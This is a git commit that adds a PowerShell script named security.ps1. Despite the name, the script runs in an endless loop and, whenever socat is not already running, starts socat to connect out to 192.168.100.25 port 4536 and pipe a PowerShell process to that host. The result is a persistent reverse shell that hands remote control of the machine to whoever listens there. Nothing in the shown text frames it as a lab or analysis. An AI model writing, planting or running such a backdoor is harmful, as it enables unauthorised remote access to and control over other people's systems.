0daeeec6e5d7e726c61621ccf45ee76f14da8e89
KffeePt <95396642+KffeePt@users.noreply.github.com>
2021-12-11 01:39:22 -0600

    Create security.ps1

---
+++ security.ps1
@@ -0,0 +1,20 @@
+$multilineScript = @' 
+
+if(Get-Process -Name socat.exe | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
+	Write-Host "socat running"
+}else{
+Write-Host "socat not running"
+	powershell.exe .\socat -d -d TCP4:192.168.100.25:4536 EXEC:'powershell.exe',pipes
+	
+}
+'@
+$scriptBlock = [scriptblock]::Create($multilineScript)
+while($true){
+
+Invoke-Command -ScriptBlock $scriptBlock
+Start-Sleep -Seconds 10
+continue
+
+}
+
+
